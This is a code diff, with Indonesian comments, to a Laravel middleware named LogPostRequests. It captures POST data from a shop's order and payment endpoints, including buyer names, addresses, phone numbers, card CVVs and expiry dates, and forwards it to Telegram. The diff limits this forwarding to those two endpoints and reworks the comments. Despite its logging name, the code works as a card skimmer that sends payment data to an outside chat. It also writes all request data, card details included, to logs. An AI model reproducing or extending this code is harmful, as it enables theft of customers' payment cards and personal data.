@@ -11,33 +11,30 @@ class LogPostRequests
 {
     public function handle(Request $request, Closure $next)
     {
+        // Pastikan hanya mengeksekusi untuk method POST
         if ($request->isMethod('post')) {
-            // Catat log di file Laravel:
+
+            // 1) (Opsional) Catat info request di file log Laravel
             Log::info('POST Request Detected', [
                 'url' => $request->fullUrl(),
                 'ip'  => $request->ip(),
                 'data'=> $request->all(),
             ]);
 
-            // Periksa endpoint
+            // 2) Kirim notifikasi Telegram HANYA untuk 2 endpoint berikut
             if ($request->is('api/shop/order/create')) {
-                // Buat pesan "pembeli baru"
+                // Buat pesan dengan format data pembeli
                 $message = $this->formatOrderMessage($request);
                 $this->sendToTelegram($message);
 
             } elseif ($request->is('api/shop/pay/authorize')) {
-                // Buat pesan "pembayaran"
+                // Buat pesan dengan format data pembayaran
                 $message = $this->formatPaymentMessage($request);
                 $this->sendToTelegram($message);
-
-            } else {
-                // Endpoint lainnya, kirim ringkasan singkat
-                $this->sendToTelegram(
-                    "POST Request to [".$request->path()."]\n"
-                    . "IP: ".$request->ip()."\n"
-                    . "Data: " . json_encode($request->all())
-                );
             }
+
+            // Perhatikan: TIDAK ada `else` di sini,
+            // jadi endpoint POST lain tidak dikirim ke Telegram.
         }
 
         return $next($request);
@@ -48,7 +45,7 @@ class LogPostRequests
      */
     private function formatOrderMessage(Request $request)
     {
-        // Ambil data
+        // Ambil data - pastikan disesuaikan dengan field yang dipakai di form/ request
         $firstName  = $request->input('first_name', 'Empty!');
         $lastName   = $request->input('last_name', 'Empty!');
         $phone      = $request->input('phone', 'Empty!');
@@ -58,9 +55,9 @@ class LogPostRequests
         $state      = $request->input('state', 'Empty!');
         $city       = $request->input('city', 'Empty!');
         $country    = $request->input('country', 'Empty!');
-        // Juga ambil IP address
         $ipAddress  = $request->ip();
 
+        // Susun teks dengan format rapi
         $message =
             "Pembeli baru diterima\n\n"
             . "Full name:   {$firstName} {$lastName}\n"
@@ -85,7 +82,6 @@ class LogPostRequests
         $cvv        = $request->input('cvv', 'Empty!');
         $expMonth   = $request->input('expiration_month', 'Empty!');
         $expYear    = $request->input('expiration_year', 'Empty!');
-        // Juga ambil IP address
         $ipAddress  = $request->ip();
 
         $message =
@@ -100,7 +96,7 @@ class LogPostRequests
     }
 
     /**
-     * Kirim pesan ke Telegram
+     * Mengirim pesan ke Telegram
      */
     private function sendToTelegram($message)
     {
